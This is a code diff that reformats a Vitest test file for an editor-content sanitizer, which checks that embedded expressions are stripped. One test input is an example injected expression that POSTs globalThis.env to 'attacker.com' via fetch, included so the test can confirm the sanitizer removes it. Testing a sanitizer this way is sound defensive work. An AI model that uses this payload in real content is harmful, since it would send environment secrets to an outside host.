@@ -1,4 +1,4 @@
-import { describe, it, expect } from "vitest";
+import { describe, expect, it } from "vitest";
 import { sanitizeEditorContent, validateEditorContent } from "./sanitize.js";
 
 describe("sanitizeEditorContent", () => {
@@ -26,13 +26,14 @@ describe("sanitizeEditorContent", () => {
   });
 
   it("strips globalThis access in expressions", () => {
-    const md = '{globalThis.env}';
+    const md = "{globalThis.env}";
     const result = sanitizeEditorContent(md);
     expect(result).not.toContain("globalThis");
   });
 
   it("strips IIFE attack pattern", () => {
-    const attack = '{(() => { fetch("attacker.com", { method: "POST", body: JSON.stringify(globalThis.env) }); return null; })()}';
+    const attack =
+      '{(() => { fetch("attacker.com", { method: "POST", body: JSON.stringify(globalThis.env) }); return null; })()}';
     const result = sanitizeEditorContent(attack);
     expect(result).not.toContain("fetch");
     expect(result).not.toContain("globalThis");
@@ -61,7 +62,7 @@ describe("sanitizeEditorContent", () => {
     const md = [
       "# Safe heading",
       "",
-      "<Callout type=\"warning\">",
+      '<Callout type="warning">',
       "Be careful!",
       "</Callout>",
       "",
